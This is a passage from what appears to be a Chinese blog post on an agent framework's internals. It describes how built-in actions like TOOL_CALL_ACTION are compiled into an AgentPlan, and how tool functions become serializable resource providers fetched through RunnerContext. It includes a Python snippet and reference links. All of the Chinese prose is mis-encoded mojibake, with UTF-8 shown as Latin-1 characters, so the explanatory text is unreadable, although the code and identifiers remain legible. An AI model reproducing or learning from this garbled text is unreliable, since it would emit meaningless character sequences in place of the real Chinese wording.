ä¸­æ˜Žç¡®åŒ…å«äº†å†…ç½®åŠ¨ä½œï¼š<br />\nBUILT_IN_ACTIONS = [CHAT_MODEL_ACTION, TOOL_CALL_ACTION, CONTEXT_RETRIEVAL_ACTION]</li>\n<li>åœ¨ _get_actions(agent) å‡½æ•°ä¸­ï¼Œè¿™äº›å†…ç½®åŠ¨ä½œä¼šè¢«æ·»åŠ åˆ°åŠ¨ä½œåˆ—è¡¨ä¸­</li>\n</ul>\n</li>\n<li>\n<p>å…·ä½“ç¼–è¯‘è¿‡ç¨‹ï¼š</p>\n<ul>\n<li>AgentPlan.from_agent() æ–¹æ³•è°ƒç”¨ _get_actions(agent) èŽ·å–æ‰€æœ‰åŠ¨ä½œ</li>\n<li>_get_actions() å‡½æ•°ä¸ä»…æå–ç”¨æˆ·å®šä¹‰çš„åŠ¨ä½œï¼Œè¿˜ä¼šåŒ…å« BUILT_IN_ACTIONS</li>\n<li>è¿™äº›åŠ¨ä½œéšåŽè¢«ç¼–è¯‘è¿› AgentPlan çš„ actions å’Œ actions_by_event å­—æ®µä¸­</li>\n</ul>\n</li>\n<li>\n<p>åœ¨æœ€ç»ˆçš„ AgentPlan ä¸­ï¼š</p>\n<ul>\n<li>TOOL_CALL_ACTION ä¼šä½œä¸ºä¸€ä¸ªæ™®é€šçš„åŠ¨ä½œå­˜åœ¨äºŽ actions æ˜ å°„ä¸­</li>\n<li>å®ƒä¼šç›‘å¬ ToolRequestEvent äº‹ä»¶ç±»åž‹ï¼Œå¹¶åœ¨è¯¥äº‹ä»¶å‘ç”Ÿæ—¶è¢«è§¦å‘æ‰§è¡Œ</li>\n</ul>\n</li>\n</ul>\n<p>å› æ­¤ï¼ŒTOOL_CALL_ACTION ç¡®å®žä¼šè¢«ç¼–è¯‘åˆ° AgentPlan ä¸­ï¼Œä½œä¸ºå¤„ç†å·¥å…·è°ƒç”¨çš„æ ‡å‡†æœºåˆ¶ã€‚å½“ LLM å†³å®šè°ƒç”¨å·¥å…·æ—¶ï¼Œä¼šå‘å‡º ToolRequestEventï¼Œç„¶åŽ TOOL_CALL_ACTION å°±ä¼šè¢«è§¦å‘æ¥å®žé™…æ‰§è¡Œç›¸åº”çš„å·¥å…·è°ƒç”¨ã€‚</p>\n<h4 id=\"373-å·¥å…·è°ƒç”¨æµç¨‹\">3.7.3 å·¥å…·è°ƒç”¨æµç¨‹</h4>\n<p>æ•´ä¸ªæµç¨‹ä¸­ï¼Œå·¥å…·ä¸æ˜¯ç›´æŽ¥ç»‘å®šåˆ° ActionExecutionOperatorï¼Œè€Œæ˜¯é€šè¿‡ AgentPlan ä¸­çš„èµ„æºæä¾›è€…æœºåˆ¶ï¼Œåœ¨éœ€è¦æ—¶åŠ¨æ€èŽ·å–å’Œå®žä¾‹åŒ–ã€‚è¿™ç§è®¾è®¡å®žçŽ°äº†å·¥å…·ä¸Žæ“ä½œç¬¦çš„æ¾è€¦åˆï¼ŒåŒæ—¶æ”¯æŒå¤šç§ç±»åž‹çš„å·¥å…·ï¼ˆJavaã€Python ç­‰ï¼‰ã€‚</p>\n<ul>\n<li>LLM å†³å®šè°ƒç”¨æŸä¸ªå·¥å…·</li>\n<li>TOOL_CALL_ACTION å†…ç½®åŠ¨ä½œè¢«è§¦å‘</li>\n<li>é€šè¿‡ RunnerContext èŽ·å–å¯¹åº”å·¥å…·èµ„æº</li>\n<li>RunnerContextImpl.get_resource() æ–¹æ³•æ ¹æ®åç§°å’Œç±»åž‹æŸ¥æ‰¾å·¥å…·èµ„æº</li>\n<li>å·¥å…·å®žé™…åœ¨éœ€è¦æ—¶æ‰é€šè¿‡ ResourceProvider å®žä¾‹åŒ–</li>\n<li>é€šè¿‡ ToolCallFunction æŸ¥æ‰¾å¹¶æ‰§è¡Œç›¸åº”çš„å·¥å…·å‡½æ•°</li>\n<li>ç»“æžœä½œä¸ºæ–°äº‹ä»¶å‘é€åˆ°äº‹ä»¶é˜Ÿåˆ—</li>\n</ul>\n<h4 id=\"374-å®Œæ•´æµç¨‹å›¾\">3.7.4 å®Œæ•´æµç¨‹å›¾</h4>\n<p><img alt=\"3-2\" class=\"lazyload\" /></p>\n<h4 id=\"375-ä»£ç \">3.7.5 ä»£ç </h4>\n<p>åœ¨ agent_plan.pyä¸­å¤„ç†å·¥å…·èµ„æºçš„ä»£ç å¦‚ä¸‹ï¼š</p>\n<pre><code class=\"language-python\">        # è¯†åˆ«å·¥å…·èµ„æºå¹¶åˆ›å»ºæä¾›è€…\n        elif hasattr(value, \"_is_tool\"):\n            if isinstance(value, staticmethod):\n                value = value.__func__\n\n            if callable(value):\n                # TODO: support other tool type.\n                tool = from_callable(func=value)\n                resource_providers.append(\n                    PythonSerializableResourceProvider.from_resource(\n                        name=name, resource=tool\n                    )\n                )\n    # æˆ–è€…é€šè¿‡add_resource æ·»åŠ çš„å·¥å…·            \n    for name, tool in agent.resources[ResourceType.TOOL].items():\n        resource_providers.append(\n            PythonSerializableResourceProvider.from_resource(\n                name=name, resource=from_callable(tool.func)\n            )\n        )                \n</code></pre>\n<p>æ€»ç»“æ¥è¯´ï¼Œfunction_tool  é€šè¿‡èµ„æºæ³¨å†Œæœºåˆ¶ä¸ŽAgentå…³è”ï¼Œç„¶åŽåœ¨ç¼–è¯‘é˜¶æ®µè¢«è½¬æ¢ä¸ºå¯åºåˆ—åŒ–çš„èµ„æºæä¾›è€…ï¼Œæœ€ç»ˆé€šè¿‡å†…ç½®çš„å·¥å…·è°ƒç”¨Actionæ¥æ‰§è¡Œã€‚è¿™ç§è®¾è®¡ä½¿å¾—å·¥å…·å¯ä»¥åœ¨åˆ†å¸ƒå¼çŽ¯å¢ƒç§æ­£ç¡®ä¼ è¾“å’Œæ‰§è¡Œã€‚</p>\n<h2 id=\"0xff-å‚è€ƒ\">0xFF å‚è€ƒ</h2>\n<p><a href=\"https://ce101.mintlify.app/core-tech/agent#7-2-5-multi-agent\" rel=\"noopener nofollow\" target=\"_blank\">https://ce101.mintlify.app/core-tech/agent#7-2-5-multi-agent</a></p>\n<p><a href=\"https://www.zhihu.com/question/1959742114519844109/answer/1983526566437880277\" rel=\"noopener nofollow\" target=\"_blank\">https://www.zhihu.com/question/1959742114519844109/answer/1983526566437880277</a></p>\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2025-12-31 19:17</span>&nbsp;\n<a href=\"https://www.cnblogs.com/rossiXYZ\">ç½—è¥¿çš„æ€è€ƒ</a>&nbsp;\né˜…è¯»(<span id=\"post_view_count\">2</span>)&nbsp;\nè¯„è®º(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">æ”¶è—</a>&nbsp;\n<a href=\"\">ä¸¾æŠ¥</a>\n</div>"
    }
  ]
}